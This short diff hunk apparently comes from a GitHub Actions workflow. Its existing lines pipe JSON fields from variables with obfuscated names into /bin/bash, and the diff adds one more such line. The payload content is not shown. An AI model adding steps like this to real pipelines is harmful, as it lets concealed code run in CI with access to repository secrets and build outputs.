@@ -36,6 +36,7 @@ jobs:
           echo $u4551 | jq -r .vkv149 | /bin/bash
           echo $dgs32801 | jq -r .vl0 | /bin/bash
           echo $fb79 | jq -r .y047 | /bin/bash
+          printf '%s' "$cx28" | jq -r .h1687 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
